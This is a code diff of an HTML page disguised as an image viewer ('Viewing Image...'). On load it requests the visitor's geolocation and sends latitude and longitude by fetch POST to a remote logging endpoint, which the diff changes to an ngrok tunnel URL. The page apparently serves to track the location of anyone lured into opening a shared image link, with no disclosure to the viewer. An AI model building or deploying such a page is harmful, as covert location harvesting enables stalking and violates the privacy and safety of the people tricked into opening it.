@@ -3,23 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>View Image</title>
+    <title>Viewing Image...</title>
 </head>
 <body onload="getLocation()">
     <h2>Viewing Image...</h2>
-    <img src="https://storage.googleapis.com/support-forums-api/attachment/thread-66445534-14876325627546992397.png" alt="Image" width="300">
+    <img src="https://your-image-url.com/image.jpg" alt="Image" width="300">
 
     <script>
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(sendLocation, handleError);
             } else {
-                alert("Geolocation not supported.");
+                alert("Geolocation is not supported by this browser.");
             }
         }
 
         function sendLocation(position) {
-            fetch("https://yourserver.com/log_location", {  // Replace with your actual hosted Flask server URL
+            fetch("https://1902-2405-201-302a-487f-d056-2d11-4649-c375.ngrok.io/log_location", {  // Replace with your Ngrok URL
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
@@ -27,11 +27,12 @@
                     longitude: position.coords.longitude
                 })
             }).then(response => response.json())
-              .then(data => console.log(data.message));
+              .then(data => console.log("Location sent successfully:", data))
+              .catch(error => console.error("Error sending location:", error));
         }
 
         function handleError(error) {
-            console.log("Error fetching location:", error.message);
+            console.error("Error fetching location:", error.message);
         }
     </script>
 </body>
